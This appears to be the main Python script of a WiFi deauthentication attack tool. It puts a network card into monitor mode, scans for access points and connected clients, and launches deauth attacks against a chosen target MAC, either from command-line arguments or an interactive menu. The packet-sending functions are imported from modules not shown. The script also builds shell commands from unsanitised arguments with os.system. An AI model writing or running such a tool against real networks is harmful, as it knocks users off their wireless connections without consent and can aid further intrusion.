from SetUp import *
from Sniff import *
from Deauth import start_deauth, stop_event, set_seq
import argparse
import inquirer

def Get_UserInput():
    parser = argparse.ArgumentParser(description="Deauth wifi of target device")
    parser.add_argument("-i", "--Interface", type=str, required=True, help="Enter your interface of network card on the device.")
    parser.add_argument("-t", "--Target", type=str, help="Enter your target's MAC address to launch the attack.")
    parser.add_argument("-ch", "--Channel", type=str,help="Enter the wifi's channel is working on.")
    parser.add_argument("-a", "--AccessPointsMAC", type=str, help="Enter the MAC of target's WIFI.")
    args = parser.parse_args()

    if args.Target and (not args.Channel or not args.AccessPointsMAC):
        parser.error("--Channel and --AccessPointsMAC are required when --Target is specified.")
        exit(1)
    return args

if __name__ == "__main__":
    
    
    try:
        args_dict = Get_UserInput()
        interface = args_dict.Interface
        target = args_dict.Target
        AP = args_dict.AccessPointsMAC
        channel = args_dict.Channel
        monitor_mode(interface)
        set_iface(interface)
        if target:
            os.system(f"iw dev {interface} set channel {channel}")

            start_deauth(target, AP, interface)
        else:
            while True:
                questions = [
                inquirer.List('option', message="Do you want", choices=['AP Scan', 'Client Scan', 'Deauth', 'Exit'],),]
                answers = inquirer.prompt(questions)
                if answers['option'] == 'AP Scan':
                    AP_list.clear()
                    stop_change_channel.clear()
                    networks.clear_rows()

                    AP_sniffing()
                    if len(AP_list) == 0:
                        print("No AP found. Exiting...")
                        exit(1)
                elif answers['option'] == 'Client Scan':
                    os.system("clear")
                    print(networks)
                    STA_list.clear()
                    clients.clear_rows()

                    indexA = input("Enter AP (number): ")
                    STA_sniffing(indexA)
                elif answers['option'] == 'Deauth':
                    os.system("clear")
                    print(clients)
                    if len(STA_list) != 0:
                        stop_event.clear()
                        indexC = input("Enter STA (number): ")
                        set_seq()
                        start_deauth(STA_list[int(indexC) - 1], AP_list[int(indexA) - 1][0], interface)
                elif answers['option'] == 'Exit':
                    exit(1)
    finally:
        managed_mode(interface)